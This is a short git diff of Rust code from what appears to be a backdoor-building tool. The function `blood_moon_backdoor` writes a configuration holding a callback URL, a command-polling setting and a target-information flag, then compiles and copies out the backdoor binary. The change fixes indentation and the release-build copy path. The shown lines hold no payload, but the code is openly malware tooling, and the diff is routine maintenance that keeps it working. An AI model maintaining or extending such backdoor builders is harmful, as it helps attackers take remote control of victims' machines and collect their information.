@@ -21,9 +21,9 @@ use crate::read_meow;
 pub fn blood_moon_backdoor(config: BloodMoonBackdoorConfig, debug: bool) -> bool {
     
     let final_setup_file = format!("
-    pub const URL: &str =  \"{}\";
-    pub const ASK_COMMAND: i32 = {};
-    pub const GET_TARGET_INFO: bool = {};",
+        pub const URL: &str =  \"{}\";
+        pub const ASK_COMMAND: i32 = {};
+        pub const GET_TARGET_INFO: bool = {};",
     config.url,
     config.ask_command,
     config.get_target_info,
@@ -48,7 +48,7 @@ pub fn blood_moon_backdoor(config: BloodMoonBackdoorConfig, debug: bool) -> bool
 
             let command = vec![
                 format!("cargo build --release --manifest-path {path}Cargo.toml"),
-                format!("cp {path}/target/debug/blood_moon_backdoor ./"),
+                format!("cp {path}target/release/blood_moon_backdoor ./"),
             ];   
 
             let mut least_result: bool = false;  
